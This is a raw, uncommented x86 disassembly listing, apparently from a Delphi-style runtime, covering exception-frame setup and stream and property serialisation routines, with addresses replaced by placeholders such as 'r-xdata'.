mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e871
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404014
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4217f4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e878
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
sub_41e89c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41e8c4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c924
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_41825c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403418
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c924
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e938
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c9f4
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c9f4
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e980
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41eb29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41c558
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eb04
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c9f4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41b420
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c9f4
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eadf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41e290
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c9f4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41b420
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c9f4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4149f8
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
lea eax [ ebp - 0x1c ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d56c
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eae6
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_41eb48
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ed42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f220
mov eax [ ebp - 0x4 ]
call sub_41c9d0
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
jmp [ eax * 4 + jump_table_41eb8a ]
mov eax [ ebp - 0x4 ]
call sub_41e430
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d540
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4133b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d540
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4133b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d540
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4133b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d324
mov eax ebx
call sub_4135a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d368
mov eax ebx
call sub_4135a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3ac
mov eax ebx
call sub_4135d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3fc
mov eax ebx
call sub_4135bc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e290
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4135e4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e34c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413610
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e430
cmp al 0x9
sete dl
mov eax ebx
call sub_413580
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e980
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f548
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5ac
push edx
push eax
mov eax ebx
call sub_4134ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed49
lea eax [ ebp - 0x1c ]
call sub_40f234
lea eax [ ebp - 0xc ]
call sub_40465c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov eax ebx
call sub_414ae0
jmp r-xdata
sub_41ed50
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_41ef1c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41be5c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41ed88
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420e54
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41edb0
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420e54
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41ee94
sub_41edf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41b39c
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41ef1c
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b3bc
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41ee48
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41ef1c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41ee94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ef0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_4210a0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41ee48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41ee48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef12
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41ef48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41ef8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404164
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420f98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef92
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41ef98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41f02a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_4210a0
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f82c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f031
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41f824
mov edx esi
mov eax edi
call sub_419b24
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f878
mov eax [ ebp - 0x4 ]
call sub_41f82c
inc esi
dec ebx
jne r-xdata
sub_41f038
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418dc4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407fbc
test al al
jne r-xdata
sub_41f088
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f1cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_421910
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41f038
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4218e4
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_421910
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4218e4
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1d6
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4218e4
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4218e4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f1dc
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f5b8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40313c
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_40423c
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eddc
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ef1c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41f834
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40313c
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_4041e0
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420eb8
mov eax [ ebp - 0x8 ]
call sub_403134
call sub_40342c
call sub_414d70
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_4041e0
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40313c
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_4041e0
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4042fc
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420eb8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f878
mov eax [ ebp - 0x4 ]
call sub_41f82c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41f559
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420eb8
mov eax [ ebp - 0x4 ]
call sub_41eddc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418dc4
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f560
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41f517
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41f088
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41ed7c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_4033e8
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41f560
mov eax [ ebp - 0x4 ]
call sub_41f82c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5bf
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_403fa0
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eddc
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41edf4
sub_41f5dc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_420ea8
mov edx esi
mov eax ebx
call sub_41f088
pop esi
pop ebx
retn
sub_41f604
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_4210a0
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41ee48
pop ebx
pop ebp
retn 0xc
sub_41f628
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_4210a0
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41ee48
pop ebx
pop ebp
retn 0x4
sub_41f64c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_4210a0
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41ee48
pop ebx
pop ebp
retn 0x8
sub_41f670
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_4210a0
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41ee48
pop ebx
pop ebp
retn 0x8
sub_41f694
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407fbc
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407fbc
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_4210a0
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407fbc
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_4210a0
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407fbc
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_4210a0
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_4210a0
mov edx esi
mov eax ebx
call sub_420eb8
mov dl 0xd
mov eax ebx
call sub_4210a0
jmp r-xdata
sub_41f758
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41ee48
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41ee48
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41ee48
jmp r-xdata
pop edx
pop ebx
retn
sub_41f7cc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_4210a0
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41ee48
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f758
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41f834
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41ee48
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f758
sub_41f878
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40342c
call sub_414d70
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_40276c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f925
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40342c
mov edx [ ebp - 0x10 ]
call sub_414f74
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414fc8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42090c
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f940
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
